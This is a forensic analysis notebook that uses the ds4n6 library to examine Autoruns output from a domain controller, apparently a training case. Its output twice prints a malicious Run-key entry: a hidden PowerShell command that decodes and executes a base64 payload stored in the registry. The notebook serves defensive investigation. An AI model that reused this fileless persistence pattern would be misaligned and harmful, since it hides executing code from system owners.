# %% [markdown]
# # **CASE VARIABLES**

# %% [markdown]
# ## **IMPORTS & INIT**

# %%
# Data Science Imports
import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
from IPython.display import display, Markdown

# Visualization
import matplotlib.pyplot as plt
import seaborn as sns
import pandas_bokeh
from bokeh.io import output_notebook, show
from bokeh.plotting import figure, output_file, show

# DFIR Imports
from timesketch_api_client import client
from timesketch_api_client import config
import timesketch_api_client

# DS4N6
from ds4n6_lib.common import analysis
from ds4n6_lib.common import anl
from ds4n6_lib.common import whatis
from ds4n6_lib.unx    import xgrep
from ds4n6_lib.gui    import read_data_gui
from ds4n6_lib.gui    import xmenu
from ds4n6_lib.gui    import xdisplay

import ds4n6_lib.d4          as d4
import ds4n6_lib.common      as d4com
import ds4n6_lib.autoruns    as d4atrs
import ds4n6_lib.fstl        as d4fstl
import ds4n6_lib.plaso       as d4pl
import ds4n6_lib.kansa       as d4ksa
import ds4n6_lib.kape        as d4kp
import ds4n6_lib.evtx        as d4evtx
import ds4n6_lib.unx         as d4unx
import ds4n6_lib.utils       as d4utl
import ds4n6_lib.volatility  as d4vol
import ds4n6_lib.gui         as d4gui

# Standard python imports
from time import sleep
import datetime
import time
import re
import os.path
import nbformat as nbf
import calendar
import glob
import xmltodict
import untangle
import importlib
import logging

# Data Save/Restore
import dill
import pickle
import gdown

import warnings
warnings.filterwarnings("ignore",category=DeprecationWarning)
warnings.filterwarnings("ignore",category=UserWarning)

# %% [markdown]
# ## **VARIABLES**

# %%
home_path=!pwd
thisnb=home_path[0]+"/szechuan_autoruns.ipynb"

# %% [markdown]
# ## **READ DATA**

# %%
url = 'https://drive.google.com/uc?id=1oddrNtlIfhWSm773yKZ-uZwPgKrOUnUq'
of = 'autoruns.tgz'
gdown.download(url, of, quiet=False)
gdown.extractall("autoruns.tgz", to="autoruns/")
# Out:
# Downloading...
# From: https://drive.google.com/uc?id=1oddrNtlIfhWSm773yKZ-uZwPgKrOUnUq
# To: /home/jovyan/autoruns.tgz
# 100%|██████████| 189k/189k [00:00<00:00, 80.6MB/s]
# ['autoruns/autorunsc-citadel-dc01.csv']

# %%
# %%time

d4.debug = 0

# Read raw data
read_data_gui(tool="autoruns", rootpath=home_path[0]+"/autoruns", path_prefix="dc01", usepickle=False, encoding='utf-16', notebook_file=thisnb)
# Out:
# - Searching notebook for saved input file / folder (_autorunsd)
#   + Not Found
# Select _autorunsd file:
# Accordion(children=(SelectMultiple(options=(('[..]', '..'), ('autorunsc-citadel-dc01.csv', 'autorunsc-citadel-…
# Button(description='SELECT & READ', style=ButtonStyle())
# Output()
# CPU times: user 46 ms, sys: 3.72 ms, total: 49.7 ms
# Wall time: 44.5 ms

# %%
atrsdf = d4.out

# %%
# Automatically created - DO NOT EDIT OR REMOVE unless you want to change the file to read (in that case, remove this cell)
# 2021-04-07 09:25:22.859126
# _autorunsd_f2read = "/home/jovyan/autoruns/autorunsc-citadel-dc01.csv"

# %% [markdown]
# ## **ANALYSIS**

# %%
xdisplay()
# Out:
# #### Pandas options
# IntText(value=60, description='display.max_rows: ', style=DescriptionStyle(description_width='initial'))
# IntText(value=10, description='display.min_rows: ', style=DescriptionStyle(description_width='initial'))
# IntText(value=20, description='display.max_columns: ', style=DescriptionStyle(description_width='initial'))
# Dropdown(description='display.colheader_justify: ', options=('right', 'left'), style=DescriptionStyle(descript…
# Checkbox(value=True, description='display.expand_frame_repr', indent=False, style=DescriptionStyle(description…

# %%
xmenu(atrsdf)
# Out:
# **DataFrame visualization menu:**
# Box(children=(Dropdown(description='Select DataFrame or Column', layout=Layout(width='550px'), options=('Selec…
# HBox(children=(Label(value='Selected dataframe: '),))
# HBox(children=(HTML(value="<div style='color: orange; font-weight: bold;'>Data Loading. Please Wait…</div>"),)…
# Output(layout=Layout(overflow='auto', width='99%'))
# Output(layout=Layout(overflow='auto', width='99%'))

# %%
analysis(atrsdf)
# Out:
# Syntax: analysis(obj, "analysis_type")
#
# Available autoruns analysis types:
# - find_powershell: Analyze data and find powershell

# %%
analysis(atrsdf,"find_powershell")
# Out:
# **Statistics:**
# <br>No. Entries: 1
# <style  type="text/css" >
# </style><table id="T_e00c4_" style='display:inline'><caption>HIDDEN COLUMNS</caption><thead>    <tr>        <th class="blank level0" ></th>        <th class="col_heading level0 col0" >0</th>    </tr></thead><tbody>
#                 <tr>
#                         <th id="T_e00c4_level0_row0" class="row_heading level0 row0" >0</th>
#                         <td id="T_e00c4_row0_col0" class="data row0 col0" >MD5</td>
#             </tr>
#             <tr>
#                         <th id="T_e00c4_level0_row1" class="row_heading level0 row1" >1</th>
#                         <td id="T_e00c4_row1_col0" class="data row1 col0" >SHA-1</td>
#             </tr>
#             <tr>
#                         <th id="T_e00c4_level0_row2" class="row_heading level0 row2" >2</th>
#                         <td id="T_e00c4_row2_col0" class="data row2 col0" >PESHA-1</td>
#             </tr>
#             <tr>
#                         <th id="T_e00c4_level0_row3" class="row_heading level0 row3" >3</th>
#                         <td id="T_e00c4_row3_col0" class="data row3 col0" >PESHA-256</td>
#             </tr>
#             <tr>
#                         <th id="T_e00c4_level0_row4" class="row_heading level0 row4" >4</th>
#                         <td id="T_e00c4_row4_col0" class="data row4 col0" >SHA-256</td>
#             </tr>
#             <tr>
#                         <th id="T_e00c4_level0_row5" class="row_heading level0 row5" >5</th>
#                         <td id="T_e00c4_row5_col0" class="data row5 col0" >IMP</td>
#             </tr>
#     </tbody></table>   <style  type="text/css" >
# </style><table id="T_4844f_" style='display:inline'><caption>CONSTANT COLUMNS</caption><thead>    <tr>        <th class="blank level0" ></th>        <th class="col_heading level0 col0" >Column</th>        <th class="col_heading level0 col1" >Value</th>    </tr></thead><tbody>
#                 <tr>
#                         <th id="T_4844f_level0_row0" class="row_heading level0 row0" >0</th>
#                         <td id="T_4844f_row0_col0" class="data row0 col0" >D4_DataType_</td>
#                         <td id="T_4844f_row0_col1" class="data row0 col1" >autoruns</td>
#             </tr>
#             <tr>
#                         <th id="T_4844f_level0_row1" class="row_heading level0 row1" >1</th>
#                         <td id="T_4844f_row1_col0" class="data row1 col0" >D4_Orchestrator_</td>
#                         <td id="T_4844f_row1_col1" class="data row1 col1" >nan</td>
#             </tr>
#             <tr>
#                         <th id="T_4844f_level0_row2" class="row_heading level0 row2" >2</th>
#                         <td id="T_4844f_row2_col0" class="data row2 col0" >D4_Tool_</td>
#                         <td id="T_4844f_row2_col1" class="data row2 col1" >autoruns</td>
#             </tr>
#             <tr>
#                         <th id="T_4844f_level0_row3" class="row_heading level0 row3" >3</th>
#                         <td id="T_4844f_row3_col0" class="data row3 col0" >D4_Plugin_</td>
#                         <td id="T_4844f_row3_col1" class="data row3 col1" >nan</td>
#             </tr>
#             <tr>
#                         <th id="T_4844f_level0_row4" class="row_heading level0 row4" >4</th>
#                         <td id="T_4844f_row4_col0" class="data row4 col0" >D4_Hostname_</td>
#                         <td id="T_4844f_row4_col1" class="data row4 col1" >nan</td>
#             </tr>
#             <tr>
#                         <th id="T_4844f_level0_row5" class="row_heading level0 row5" >5</th>
#                         <td id="T_4844f_row5_col0" class="data row5 col0" >Time</td>
#                         <td id="T_4844f_row5_col1" class="data row5 col1" >2013-08-22 03:59:00</td>
#             </tr>
#             <tr>
#                         <th id="T_4844f_level0_row6" class="row_heading level0 row6" >6</th>
#                         <td id="T_4844f_row6_col0" class="data row6 col0" >Entry Location</td>
#                         <td id="T_4844f_row6_col1" class="data row6 col1" >HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</td>
#             </tr>
#             <tr>
#                         <th id="T_4844f_level0_row7" class="row_heading level0 row7" >7</th>
#                         <td id="T_4844f_row7_col0" class="data row7 col0" >Entry</td>
#                         <td id="T_4844f_row7_col1" class="data row7 col1" >coreupdate</td>
#             </tr>
#             <tr>
#                         <th id="T_4844f_level0_row8" class="row_heading level0 row8" >8</th>
#                         <td id="T_4844f_row8_col0" class="data row8 col0" >Enabled</td>
#                         <td id="T_4844f_row8_col1" class="data row8 col1" >enabled</td>
#             </tr>
#             <tr>
#                         <th id="T_4844f_level0_row9" class="row_heading level0 row9" >9</th>
#                         <td id="T_4844f_row9_col0" class="data row9 col0" >Category</td>
#                         <td id="T_4844f_row9_col1" class="data row9 col1" >Logon</td>
#             </tr>
#             <tr>
#                         <th id="T_4844f_level0_row10" class="row_heading level0 row10" >10</th>
#                         <td id="T_4844f_row10_col0" class="data row10 col0" >Profile</td>
#                         <td id="T_4844f_row10_col1" class="data row10 col1" >System-wide</td>
#             </tr>
#             <tr>
#                         <th id="T_4844f_level0_row11" class="row_heading level0 row11" >11</th>
#                         <td id="T_4844f_row11_col0" class="data row11 col0" >Description</td>
#                         <td id="T_4844f_row11_col1" class="data row11 col1" >Windows PowerShell</td>
#             </tr>
#             <tr>
#                         <th id="T_4844f_level0_row12" class="row_heading level0 row12" >12</th>
#                         <td id="T_4844f_row12_col0" class="data row12 col0" >Signer</td>
#                         <td id="T_4844f_row12_col1" class="data row12 col1" >(Verified) Microsoft Windows</td>
#             </tr>
#             <tr>
#                         <th id="T_4844f_level0_row13" class="row_heading level0 row13" >13</th>
#                         <td id="T_4844f_row13_col0" class="data row13 col0" >Signer_Verified_</td>
#                         <td id="T_4844f_row13_col1" class="data row13 col1" >True</td>
#             </tr>
#             <tr>
#                         <th id="T_4844f_level0_row14" class="row_heading level0 row14" >14</th>
#                         <td id="T_4844f_row14_col0" class="data row14 col0" >Company</td>
#                         <td id="T_4844f_row14_col1" class="data row14 col1" >Microsoft Corporation</td>
#             </tr>
#             <tr>
#                         <th id="T_4844f_level0_row15" class="row_heading level0 row15" >15</th>
#                         <td id="T_4844f_row15_col0" class="data row15 col0" >Image Path</td>
#                         <td id="T_4844f_row15_col1" class="data row15 col1" >c:\windows\system32\windowspowershell\v1.0\powershell.exe</td>
#             </tr>
#             <tr>
#                         <th id="T_4844f_level0_row16" class="row_heading level0 row16" >16</th>
#                         <td id="T_4844f_row16_col0" class="data row16 col0" >Version</td>
#                         <td id="T_4844f_row16_col1" class="data row16 col1" >6.3.9600.16384</td>
#             </tr>
#             <tr>
#                         <th id="T_4844f_level0_row17" class="row_heading level0 row17" >17</th>
#                         <td id="T_4844f_row17_col0" class="data row17 col0" >Launch String</td>
#                         <td id="T_4844f_row17_col1" class="data row17 col1" >%COMSPEC% /b /c start /b /min powershell -nop -w hidden -c "sleep 0; iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item 'HKLM:Software\9sEoCawv').GetValue('45SVAG2o'))))""</td>
#             </tr>
#     </tbody></table>
# <style  type="text/css" >
# </style><table id="T_e8a89_" ><thead>    <tr>        <th class="blank level0" ></th>        <th class="col_heading level0 col0" >index</th>        <th class="col_heading level0 col1" >606</th>    </tr></thead><tbody>
#         </tbody></table>

# %%
d4com.data_identify(atrsdf)
# Out:
# 'pandas_dataframe-autoruns-ham'

# %%
from ds4n6_lib.autoruns import analysis_find_powershell

# %%
analysis_find_powershell(atrsdf)
# Out:
# **Statistics:**
# <br>No. Entries: 1
# <style  type="text/css" >
# </style><table id="T_1a4f1_" style='display:inline'><caption>HIDDEN COLUMNS</caption><thead>    <tr>        <th class="blank level0" ></th>        <th class="col_heading level0 col0" >0</th>    </tr></thead><tbody>
#                 <tr>
#                         <th id="T_1a4f1_level0_row0" class="row_heading level0 row0" >0</th>
#                         <td id="T_1a4f1_row0_col0" class="data row0 col0" >MD5</td>
#             </tr>
#             <tr>
#                         <th id="T_1a4f1_level0_row1" class="row_heading level0 row1" >1</th>
#                         <td id="T_1a4f1_row1_col0" class="data row1 col0" >SHA-1</td>
#             </tr>
#             <tr>
#                         <th id="T_1a4f1_level0_row2" class="row_heading level0 row2" >2</th>
#                         <td id="T_1a4f1_row2_col0" class="data row2 col0" >PESHA-1</td>
#             </tr>
#             <tr>
#                         <th id="T_1a4f1_level0_row3" class="row_heading level0 row3" >3</th>
#                         <td id="T_1a4f1_row3_col0" class="data row3 col0" >PESHA-256</td>
#             </tr>
#             <tr>
#                         <th id="T_1a4f1_level0_row4" class="row_heading level0 row4" >4</th>
#                         <td id="T_1a4f1_row4_col0" class="data row4 col0" >SHA-256</td>
#             </tr>
#             <tr>
#                         <th id="T_1a4f1_level0_row5" class="row_heading level0 row5" >5</th>
#                         <td id="T_1a4f1_row5_col0" class="data row5 col0" >IMP</td>
#             </tr>
#     </tbody></table>   <style  type="text/css" >
# </style><table id="T_4ddcf_" style='display:inline'><caption>CONSTANT COLUMNS</caption><thead>    <tr>        <th class="blank level0" ></th>        <th class="col_heading level0 col0" >Column</th>        <th class="col_heading level0 col1" >Value</th>    </tr></thead><tbody>
#                 <tr>
#                         <th id="T_4ddcf_level0_row0" class="row_heading level0 row0" >0</th>
#                         <td id="T_4ddcf_row0_col0" class="data row0 col0" >D4_DataType_</td>
#                         <td id="T_4ddcf_row0_col1" class="data row0 col1" >autoruns</td>
#             </tr>
#             <tr>
#                         <th id="T_4ddcf_level0_row1" class="row_heading level0 row1" >1</th>
#                         <td id="T_4ddcf_row1_col0" class="data row1 col0" >D4_Orchestrator_</td>
#                         <td id="T_4ddcf_row1_col1" class="data row1 col1" >nan</td>
#             </tr>
#             <tr>
#                         <th id="T_4ddcf_level0_row2" class="row_heading level0 row2" >2</th>
#                         <td id="T_4ddcf_row2_col0" class="data row2 col0" >D4_Tool_</td>
#                         <td id="T_4ddcf_row2_col1" class="data row2 col1" >autoruns</td>
#             </tr>
#             <tr>
#                         <th id="T_4ddcf_level0_row3" class="row_heading level0 row3" >3</th>
#                         <td id="T_4ddcf_row3_col0" class="data row3 col0" >D4_Plugin_</td>
#                         <td id="T_4ddcf_row3_col1" class="data row3 col1" >nan</td>
#             </tr>
#             <tr>
#                         <th id="T_4ddcf_level0_row4" class="row_heading level0 row4" >4</th>
#                         <td id="T_4ddcf_row4_col0" class="data row4 col0" >D4_Hostname_</td>
#                         <td id="T_4ddcf_row4_col1" class="data row4 col1" >nan</td>
#             </tr>
#             <tr>
#                         <th id="T_4ddcf_level0_row5" class="row_heading level0 row5" >5</th>
#                         <td id="T_4ddcf_row5_col0" class="data row5 col0" >Time</td>
#                         <td id="T_4ddcf_row5_col1" class="data row5 col1" >2013-08-22 03:59:00</td>
#             </tr>
#             <tr>
#                         <th id="T_4ddcf_level0_row6" class="row_heading level0 row6" >6</th>
#                         <td id="T_4ddcf_row6_col0" class="data row6 col0" >Entry Location</td>
#                         <td id="T_4ddcf_row6_col1" class="data row6 col1" >HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</td>
#             </tr>
#             <tr>
#                         <th id="T_4ddcf_level0_row7" class="row_heading level0 row7" >7</th>
#                         <td id="T_4ddcf_row7_col0" class="data row7 col0" >Entry</td>
#                         <td id="T_4ddcf_row7_col1" class="data row7 col1" >coreupdate</td>
#             </tr>
#             <tr>
#                         <th id="T_4ddcf_level0_row8" class="row_heading level0 row8" >8</th>
#                         <td id="T_4ddcf_row8_col0" class="data row8 col0" >Enabled</td>
#                         <td id="T_4ddcf_row8_col1" class="data row8 col1" >enabled</td>
#             </tr>
#             <tr>
#                         <th id="T_4ddcf_level0_row9" class="row_heading level0 row9" >9</th>
#                         <td id="T_4ddcf_row9_col0" class="data row9 col0" >Category</td>
#                         <td id="T_4ddcf_row9_col1" class="data row9 col1" >Logon</td>
#             </tr>
#             <tr>
#                         <th id="T_4ddcf_level0_row10" class="row_heading level0 row10" >10</th>
#                         <td id="T_4ddcf_row10_col0" class="data row10 col0" >Profile</td>
#                         <td id="T_4ddcf_row10_col1" class="data row10 col1" >System-wide</td>
#             </tr>
#             <tr>
#                         <th id="T_4ddcf_level0_row11" class="row_heading level0 row11" >11</th>
#                         <td id="T_4ddcf_row11_col0" class="data row11 col0" >Description</td>
#                         <td id="T_4ddcf_row11_col1" class="data row11 col1" >Windows PowerShell</td>
#             </tr>
#             <tr>
#                         <th id="T_4ddcf_level0_row12" class="row_heading level0 row12" >12</th>
#                         <td id="T_4ddcf_row12_col0" class="data row12 col0" >Signer</td>
#                         <td id="T_4ddcf_row12_col1" class="data row12 col1" >(Verified) Microsoft Windows</td>
#             </tr>
#             <tr>
#                         <th id="T_4ddcf_level0_row13" class="row_heading level0 row13" >13</th>
#                         <td id="T_4ddcf_row13_col0" class="data row13 col0" >Signer_Verified_</td>
#                         <td id="T_4ddcf_row13_col1" class="data row13 col1" >True</td>
#             </tr>
#             <tr>
#                         <th id="T_4ddcf_level0_row14" class="row_heading level0 row14" >14</th>
#                         <td id="T_4ddcf_row14_col0" class="data row14 col0" >Company</td>
#                         <td id="T_4ddcf_row14_col1" class="data row14 col1" >Microsoft Corporation</td>
#             </tr>
#             <tr>
#                         <th id="T_4ddcf_level0_row15" class="row_heading level0 row15" >15</th>
#                         <td id="T_4ddcf_row15_col0" class="data row15 col0" >Image Path</td>
#                         <td id="T_4ddcf_row15_col1" class="data row15 col1" >c:\windows\system32\windowspowershell\v1.0\powershell.exe</td>
#             </tr>
#             <tr>
#                         <th id="T_4ddcf_level0_row16" class="row_heading level0 row16" >16</th>
#                         <td id="T_4ddcf_row16_col0" class="data row16 col0" >Version</td>
#                         <td id="T_4ddcf_row16_col1" class="data row16 col1" >6.3.9600.16384</td>
#             </tr>
#             <tr>
#                         <th id="T_4ddcf_level0_row17" class="row_heading level0 row17" >17</th>
#                         <td id="T_4ddcf_row17_col0" class="data row17 col0" >Launch String</td>
#                         <td id="T_4ddcf_row17_col1" class="data row17 col1" >%COMSPEC% /b /c start /b /min powershell -nop -w hidden -c "sleep 0; iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item 'HKLM:Software\9sEoCawv').GetValue('45SVAG2o'))))""</td>
#             </tr>
#     </tbody></table>
# <style  type="text/css" >
# </style><table id="T_fd48d_" ><thead>    <tr>        <th class="blank level0" ></th>        <th class="col_heading level0 col0" >index</th>        <th class="col_heading level0 col1" >606</th>    </tr></thead><tbody>
#         </tbody></table>

# %%
d4gui.xanalysis(atrsdf)
# Out:
# **Analisys explorer:**
# Dropdown(description='Available analysis types: ', layout=Layout(width='550px'), options=(('Select analysis ty…
# Output(layout=Layout(overflow='auto', width='99%'))
